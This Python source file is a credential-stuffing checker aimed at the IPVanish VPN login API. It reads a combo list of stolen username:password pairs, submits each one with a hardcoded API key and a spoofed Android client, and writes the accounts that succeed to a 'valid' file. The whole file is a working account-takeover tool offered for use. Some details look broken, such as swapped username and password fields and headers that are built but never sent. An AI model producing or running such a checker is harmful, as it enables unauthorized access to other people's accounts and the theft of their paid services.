import requests
import time

def payload_data(user, passw):
    payload = {"api_key": "15cb936e6d19cd7db1d6f94b96017541",
               "client": "Android-4.1.2.3.186086",
               "os": "4.1.2.3.186086-gm",
               "password": user,
               "username": passw,
               "uuid": "6d29ef61-ff19-4124-a053-e148475cf889"}
    return payload


class RequestsChecker:
    def __init__(self):
        self.user = None
        self.passw = None
        self.directory = "combos/ipvanish"
        self.page = "https://api.ipvanish.com/api/v3/login"
        self.headers_data = {"Accept": "*/*",
                             "Accept-Encoding": "gzip, deflate, br",
                             "Accept-Language": "en-US,en;q=0.9",
                             "Cache-Control": "no-cache",
                             "Content-Length": "171",
                             "Content-Type": "application/x-amz-json-1.1",
                             "Origin": "https//sso.ipvanish.com",
                             "Pragma": "no-cache",
                             "Sec-Ch-Ua-Mobile": "?0",
                             "Sec-Ch-Ua-Platform": "Linux",
                             "Sec-Fetch-Dest": "empty",
                             "Sec-Fetch-Mode": "cors",
                             "Sec-Fetch-Site": "same-site",
                             "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
                             'X-Amz-Target': "AWSCognitoIdentityProviderService.InitiateAuth",
                             'X-Az-User-Agent': "aws-amplify/5.0.4 js"}

    def split_list(self):
        user = []
        password = []
        try:
            with open(self.directory, 'r') as combos:
                for line in combos.readlines():
                    user.append(line.split(":")[0].strip())
                    password.append(line.split(":")[1].strip())
            combos.close()
        except FileNotFoundError:
            print("Combo list not found. Make sure it's placed in {} and named 'ipvanish'."
                  .format(self.directory))
            exit()
        return user, password

    def make_request(self, usr, passw):
        payload = payload_data(usr, passw)
        get_request = requests.post(self.page, data=payload)
        #print(get_request.json())
        if get_request.json()['code'] == 1100:
            print("{}:{} is Invalid you wallad...".format(usr, passw))
        elif get_request.json()['code'] == 1099:
            print("{}:{} is a valid account...".format(usr, passw))
            with open("valid/ipvanish_valid_accounts", 'a') as valid_accounts:
                valid_accounts.write(usr + ":" + passw + "\n")
        time.sleep(0.3)
